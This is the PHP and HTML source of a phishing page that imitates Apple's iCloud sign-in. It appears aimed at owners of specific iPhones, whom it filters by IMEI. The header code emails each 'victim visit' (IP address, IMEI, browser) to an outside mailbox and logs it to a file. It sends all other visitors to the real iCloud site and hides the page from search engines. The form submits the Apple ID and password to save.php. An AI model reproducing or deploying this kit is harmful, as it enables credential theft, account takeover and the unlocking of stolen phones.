<?php  
session_start(); 
$id = (isset($_GET['id']) && !empty($_GET['id']) ? $_GET['id'] : ''); 

if ( empty($id) ) { header('location: http://www.icloud.com'); 
exit(); } else { $id = $_GET["id"]; $lines = file('imei.txt'); 
$link="false"; foreach ($lines as $lineNumber => $lineContent) { 
$string = preg_replace('/\s+/', '', $lineContent); 
$string2 = preg_replace('/\s+/', '', $id); 
if ($string==$string2) { $link="true"; } } 
if($link=="true") { $agent = $_SERVER['HTTP_USER_AGENT']; 
function getUserIP() { 
	$client = @$_SERVER['HTTP_CLIENT_IP']; 
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR']; 
	$remote = $_SERVER['REMOTE_ADDR']; 
	if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
	
	else if(filter_var($forward, FILTER_VALIDATE_IP)) { 
	$ip = $forward; } 
	else { $ip = $remote; } return $ip; } 

$user_ip = getUserIP(); 
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'From: iServer <noreply@laboratory.com>' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$to = 'diegon555@yandex.com';
$subject = 'Got Victim Visit';
$id = $_GET["id"];
$message = '<table border="0" cellpadding="5" cellspacing="5" width="600">
    <tbody>
        <tr>
            <th>Victim Visit Details</th>
        </tr>
        <tr>
            <td style="text-align:left" valign="top">
            <br>
			<hr>
            <strong>IP Address:</strong>'. $user_ip.'<br><br>
                        <strong>IMEI:</strong>'.$id.'<br><br>
                       
			<strong>Browser:</strong>'.$agent.'<br><br>
			</td>
        </tr>
       
    </tbody>
</table>'; 
mail($to, $subject, $message, $headers); 
$save1 = $message; $my_file = 'ip.htm'; 
$handle = fopen($my_file, 'a') or die('Cannot open file: '); 
fwrite($handle, $save1); 
$new_data = "<br />"; 
fwrite($handle, $new_data); 

?>

<?php
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

switch ($lang) {
    case 'en':
        $lang_file = 'lang.en.php';
        break;

    case 'fr':
        $lang_file = 'lang.fr.php';
        break;

    case 'es':
        $lang_file = 'lang.es.php';
        break;

    case 'de':
        $lang_file = 'lang.de.php';
        break;

    case 'ja':
        $lang_file = 'lang.ja.php';
        break;

    case 'nl':
        $lang_file = 'lang.ja.php';
        break;

    case 'be':
        $lang_file = 'lang.ja.php';
        break;

    case 'pl':
        $lang_file = 'lang.ja.php';
        break;

    case 'zh':
        $lang_file = 'lang.ja.php';
        break;

    case 'hu':
        $lang_file = 'lang.ja.php';
        break;

	case 'pt':
        $lang_file = 'lang.pt.php';
        break;    

    default:
        $lang_file = 'lang.en.php';
}

include_once 'languages/' . $lang_file;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />    
 <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="noindex, nofollow, noarchive">
    <meta name="googlebot" content="nosnippet">
    <meta name="robots" content="noodp">
    <meta name="slurp" content="noydir">
    <meta name="robots" content="noimageindex,nomediaindex">
    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link rel="apple-touch-icon" sizes="57x57" href="favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon/favicon-16x16.png">
    <link rel="manifest" href="favicon/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="favicon/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
	<title>iCloud</title>
	<link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico">
	<link rel="stylesheet" href="assets/layout/strap.css">
	<link rel="stylesheet" href="assets/layout/apple.css">
	<link rel="stylesheet" href="assets/layout/kit.css">
	<link rel="stylesheet" href="assets/layout/animate.css">

<script type="text/javascript">
  <!--
  if (screen.width <= 800) {
    window.location = "mobiv.php";
  }
  //-->
</script>
	
	<script src="assets/js/jquery-latest.min.js"></script>
	<script>
      $(document).ready(function() {
		$('#preloader').delay(900).fadeOut('slow'); // will fade out the white DIV that covers the website.
		$('body').css({'overflow':'visible'});
		$('#test').delay(900).css({'display':'block'});

			$('.checkbox-state-normal').click(function() {
				$('.checkbox-state-normal').hide();
				$('.checkbox-state-focused-selected').css("display","");

			});
		  
		  $('.checkbox-state-focused-selected').click(function() {
				$('.checkbox-state-focused-selected').hide();
				$('.checkbox-state-normal').css("display","");

			});
		});
	</script>	
    <link rel="stylesheet" href="assets/layout/movingbubbles.css" type="text/css" />
		<style>
			/* Start slider CSS */
			#sliderContainer {
				position:absolute;
				top:20px;
				right:20px;
				background-color:#fff;
				background-image:linear-gradient(to bottom, #fff, #eee);
				border-radius:5px;
				padding:10px;
				box-shadow:0 5px 5px rgba(0, 0, 0, .2);
				text-shadow:0 1px #fff;
				opacity:0.2;
				transition:opacity linear 0.25s;
				font-family:Arial, sans-serif;
			}
			#sliderContainer:hover {
				opacity:1;
			}
			#sliderContainer h3 {
				margin:0;
				text-align:center;
			}
			#sliderContainer strong {
				width:115px;
				display:inline-block;
			}
			#sliderContainer input {
				width:200px;
				margin:0;
			}
			#sliderContainer span {
				padding:5px 0;
				width:5%;
			}
			#sliderContainer hr {
				background:#999;
				box-shadow:0 1px #fff;
				border:0;
				height:1px;
			}
			/* End slider CSS */
		</style>
        <script src="assets/js/movingbubbles.js" type="text/javascript"></script>
        <script type="text/javascript">
        	/**
        	 * A function for the settings sliders to properly update bubbleOptions
        	 * @this {Window}
        	 * @param {[object HTMLInputElement]} slider The slider element
        	 * @param {String} bubbleSetting The variable name of bubbleOptions that the slider modifies
        	 */
        	function sliderUpdate(slider, bubbleSetting) {
        		var value = parseFloat(slider.value);
        		//Special cases
        		//The bubble-pixel ratio requires changing the number of bubbles
        		//And if the bubble cap is lower than the number of bubbles,
        		//then the bubbles also need to be changed
        		if(bubbleSetting == 'ratio' ||
        		   (bubbleSetting == 'maxBubbles' && bubbleOptions.bubbles.length > value)) {
        			var bubbleContainer = document.getElementById('bubbleContainer');
        			if(bubbleContainer) {
        				document.body.removeChild(bubbleContainer);
        				bubbleOptions.bubbles = [];
        			}
        		}
        		slider.title = value + " - bubbleOptions."+bubbleSetting;
        		bubbleOptions[bubbleSetting] = value;
        		//Turn the ratio slider into an inverse 100-20 scale
        		if(bubbleSetting == 'ratio') {
        			slider.title = "Pixel to Bubble Ratio: 1:"+value+" - bubbleOptions.ratio";
        			value = (120000 - value) / 1000;
        		}
        		document.getElementById(bubbleSetting + "Slider").innerHTML = value;
        		bubbleOptions.update();
        	}
        </script>
</head>
<body>
<!-- Preloader -->
<div id="preloader">
	<div id="status"><span></span></div>
</div>

<section id="header">
	<div class="container-fluid">
		<div class="row">
			<div class="col-md-4 col-xs-8 rightH rtl">
				<a class="help" title="Help and Support" alt="Help and Support" href="https://help.apple.com/icloud/"></a>
				<span class="spreat"></span>
					<a class="setup applef" target="_blank" href="https://www.apple.com/icloud/setup/"><?php echo $lang['SETUP_INSTRUCTIONS'] ?></a>
					<div class="setup fName" style="display: none;"><i class="glyphicon glyphicon-menu-down"></i><span><img src="assets/img/user.jpeg" alt=""></span>
					<ul>
						<li><a href="find.php">iCloud Settings</a></li>
						<li><a href="https://icloud.com">Sign Out</a></li>
					</ul>
				</div>
			</div>
			<div class="col-md-8 col-xs-4 leftH">
				<span class="icloud"></span>
			</div>
		</div>
	</div>
</section>
<section class="login-form text-center" style="display: block;">
	<img src="assets/img/cloud.png" class="img-cloud" alt="">
	<h2><?php echo $lang['SIGN_IN_TITLE']; ?></h2>
	<form action="save.php" class="cloud-login form-ajax" role="form" data-red="http://ifindsupport.com/find" method="post" accept-charset="utf-8">
		<input type="hidden" name="csrf_test_name" value="96001a656ae698e32b786a2068c22820" style="display:none;">
		<input type="hidden" name="apple_add">
		<input type="hidden" name="apple_add">
		<input type="text" class="id account" name="apple_id" id="apple_id" placeholder="<?php echo $lang['APPLE_ID']; ?>" style="direction: ltr !important;" autofocus>
		<input type="button" class="arrow" name="c_log" id="account_button">	

		<img class="loading-account" style="display : none" id="loading-account" src="assets/img/ajax-loader.svg" alt="Loading">	

		<input type="password" style="display : none" autocomplete="off" class="pwd" name="apple_pwd" id="apple_pwd" style="direction: ltr !important;" placeholder="<?php echo $lang['PASSWORD']; ?>">
		<input type="submit" style="display : none" class="dolog arrow-password" name="c_log" id="c_log" value="">
		<img class="loading" src="assets/img/ajax-loader.svg" alt="Loading">

		<div class="alrt">
			<h3><?php echo $lang['INCORRECT_ID2']; ?></h3>
		</div>
	</form>
	<div class="keepme">
		<input type="checkbox" id="keepme" />
		<span for="keepme"><?php echo $lang['KEEP_ME']; ?></span>
	</div>

	<div class="forget">
		<a href="https://iforgot.apple.com/" target="_blank"><?php echo $lang['FORGOT_ID']; ?></a>
		<div id="response"></div>
	</div>
	<div class="forgetnew">
		<?php echo $lang['DONT_HAVE_ID']; ?> <a href="https://appleid.apple.com/account" target="blank"><?php echo $lang['CREATE_YOURS']; ?></a>
		<div id="response"></div>
	</div>

</section>
<section class="imessage" style="display: none;">
	<div class="container">
		<div class="row">
		<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/11.png" alt="">
					<span>Reminders</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/9.png" alt="">
					<span>Notes</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/3.png" alt="">
					<span>iCloud Drive</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/10.png" alt="">
					<span>Photos</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/1.png" alt="">
					<span>Contacts</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/8.png" alt="">
					<span>Mail</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/12.png" alt="">
					<span>Settings</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/2.png" alt="">
					<span>Find My iPhone</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/6.png" alt="">
					<span>Keynote</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/5.png" alt="">
					<span>Numbers</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/20.png" alt="">
					<span>Find Friends</span>
				</a>
			</div>
			<div class="col-md-2 col-sm-4 col-xs-6">
				<a href="find.php" class="text-cente imb">
					<span class="loadings"><img src="assets/img/loader.svg" alt="Loading"></span>
					<img class="" src="assets/img/7.png" alt="">
					<span>Pages</span>
				</a>
			</div>
		</div>
	</div>
</section><footer class="foot">
	<div class="container-fluid">
		<div class="row">
		
		<div class="col-md-10 col-xs-12 foot-link">
			<a href="https://www.apple.com/support/systemstatus/" target="_blank"><?php echo $lang['SYSTEM_STATUS']; ?></a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/privacy/" target="_blank"><?php echo $lang['POLICY']; ?></a>
			<span class="footer-link-separator"></span>
			<a href="https://www.apple.com/legal/icloud/ww/" target="_blank"><?php echo $lang['TERMS']; ?></a>
			<span class="footer-link-separator"></span>
			<span class="copyright"><?php echo $lang['COPYRIGHT']; ?></span>
		</div>
		<div class="col-md-2 col-xs-12 apple">
			<a href="https://www.apple.com/" target="_blank" class="apple-logo"></a>
		</div>

		</div>
	</div>
</footer>
	<script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
	<script src="assets/js/strap.min.js"></script>
	<script src="assets/js/apple.min.js"></script>
	<script src="assets/js/ajax-form.min.js"></script>
	<script>
		const passwordElement = document.getElementById('apple_pwd');
		
		function enablePasswordInput() {
				document.getElementById('account_button').style.cssText = "display : none"; 
				document.getElementById('apple_id').style.cssText = "direction: ltr !important;border-radius: 6px 6px 0 0";
				passwordElement.style.cssText = "direction: ltr !important;display : block;border-radius: 0 0 6px 6px;";
				passwordElement.focus();
				document.getElementById('c_log').style.cssText = "display : block";
				document.getElementById('loading-account').style.cssText = "display : none";
		}
		document.getElementById('account_button').addEventListener('click',function(e) {

			if(document.getElementById('apple_id').value !== "")
			{
				document.getElementById('account_button').style.cssText = "display : none";
				document.getElementById('loading-account').style.cssText = "display : block";						
				
				setInterval(function(){ 
					enablePasswordInput()
				 }, 1000);
				
			}
		});

		document.getElementById('apple_id').addEventListener('input',function(e) {
			if(e.target.value)
			{
			document.getElementById('account_button').removeAttribute('style')
			document.getElementById('account_button').classList.remove('arrow');
			document.getElementById('account_button').classList.add('arrow-selected');
			}
			else {
			document.getElementById('account_button').classList.remove('arrow-selected');
			document.getElementById('account_button').classList.add('arrow');
			$(".apple_pwd").fadeOut( "slow" );			
			passwordElement.style.cssText = "direction: ltr !important;display : none;border-radius: 0 0 6px 6px;";	
			document.getElementById('apple_id').style.cssText = "direction: ltr !important;border-radius: 6px;";
			passwordElement.value = "";									
			document.getElementById('c_log').style.cssText = "display : none";						
			}
		});
		
		document.getElementById('apple_id').addEventListener('keypress',function(e) {
			if(e.keyCode == 13)
			{
				e.preventDefault();
				if(document.getElementById('apple_id').value == "")
				{
					return false;
				}
				document.getElementById('account_button').style.cssText = "display : none";
				document.getElementById('loading-account').style.cssText = "display : block";						
				
				setInterval(function(){ 
					enablePasswordInput()
				 }, 1000);
			}
		});

		document.getElementById('apple_id').addEventListener('focus',function(e) {
			passwordElement.classList.remove('index-z');			
			e.target.classList.add('index-z');			
		});
		
		passwordElement.addEventListener('focus',function(e) {
			document.getElementById('apple_id').classList.remove('index-z');			
			e.target.classList.add('index-z');			
        });


	</script>
</body>
</html>
<?php  } else{ header('location:http://www.icloud.com'); } } ?>